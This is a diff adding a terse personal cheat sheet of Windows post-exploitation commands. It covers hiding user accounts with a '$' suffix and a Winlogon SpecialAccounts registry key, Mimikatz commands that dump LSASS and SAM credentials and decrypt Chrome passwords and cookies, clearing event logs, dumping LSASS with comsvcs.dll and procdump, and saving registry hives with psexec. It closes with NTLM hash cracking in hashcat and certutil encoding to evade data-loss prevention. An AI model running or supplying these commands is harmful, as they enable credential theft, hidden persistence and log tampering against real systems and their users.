@@ -1,0 +1,134 @@
+*  Hide a user from net user command:
+add "$" at the end of the username.
+
+or
+wmic useraccount where name="[username]" call rename name="[username]$"
+
+or add "$" with the creation of the user.
+
+*  Hide the username from Login screen:
+enter registry editor winkey+r "regedit"
+
+browse to 
+
+Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+
+create new key: SpeacialAccounts"
+
+and inside it
+
+create another key: UserList
+
+inside create a DWORD (32-bit) with the username you wish to hide as the value name.
+
+********
+
+The Lsass.exe process query the SAM in local or remote user authentication not in a domain environment.
+and the NTDS.DIT at a domain environment.
+
+
+***************
+
+Mimikatz
+is a popular post-exploitation tool. and very known to security apps.
+
+https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210709/mimikatz_trunk.zip
+
+run mimikatz.exe from cmd As Administrator.
+
+privilege::debug
+enter debuging mode, it will give an error if running not as Admin.
+
+
+token::elavate
+elevate to NT-Authority privileges.
+
+sekurlsa::logonpasswords
+dump the Lsass.
+
+lsadump::sam
+dump the SAM
+
+log
+create log file in mimikatz folder.
+
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+Get chrome credentials
+
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
+get chrome cookies
+
+event::drop
+event::clear
+clearing logs.
+
+
+
+***********************************
+Dumping the lsass.exe
+
+1. from Task Manager right click on the process and create dump file.
+saved in TMP folder.
+
+2. with PowerShell run as Administrator
+Get-Process lsass
+enter c:\windows\system32
+.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [lsass process id] c:\lsass.dmp full
+
+3. Procdump - download  Sysinternals suite.
+procdump.exe –ma lsass.exe [pathtoexport+filename]
+accept.
+(sometimes to bypass defenders enter NT-Authority with psexec first.
+
+
+reading the dump on mimikatz:
+sekurlsa::minidump [filename] 
+sekurlsa::logonpasswords
+
+***********************************
+
+Dump the SAM with psexec.
+
+1. Download Sysinternals.
+
+2. run CMD as Admin.
+
+3. enter Sysinternals folder
+
+4. gain NT-Authority
+PsExec64.exe –s cmd.exe
+
+5. cd config
+
+6.  reg save hklm\sam c:\sam.hiv
+ reg save hklm\system c:\system.hiv
+
+take the files to the attacker station.
+run mimikatz
+lsadump::sam /system:[path to system file] /sam:[path to sam file]
+
+
+*********************************
+
+Bruteforce NTLM hash with hashcat
+hashcat -m 1000 -a 0 [hashfile] [wordlist file]
+
+online hash crack
+https://crackstation.net/
+https://hashes.com/en/decrypt/hash
+
+********************************
+
+Using cerutil to bypass protection of DLP
+certutil -encode lsass.dmp lsass.crt
+certutil -decode lsass.crt lsass.dmp
+
+
+
+
+
+
+
+ 
+
+
